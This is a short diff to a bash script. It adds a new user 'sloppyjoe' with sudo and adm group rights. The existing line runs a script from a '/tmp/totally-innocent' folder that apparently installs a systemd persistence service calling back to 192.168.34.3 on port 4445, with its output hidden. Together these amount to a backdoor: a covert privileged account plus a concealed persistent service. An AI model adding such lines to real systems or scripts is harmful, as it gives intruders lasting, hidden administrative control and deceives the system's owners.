@@ -1,4 +1,9 @@
 #!/bin/bash
+
+
+# Create Admin User sloppyjoe
+adduser --gecos "" "sloppyjoe"
+usermod -aG sudo,adm "sloppyjoe"
  
 # Service creation
 bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null 
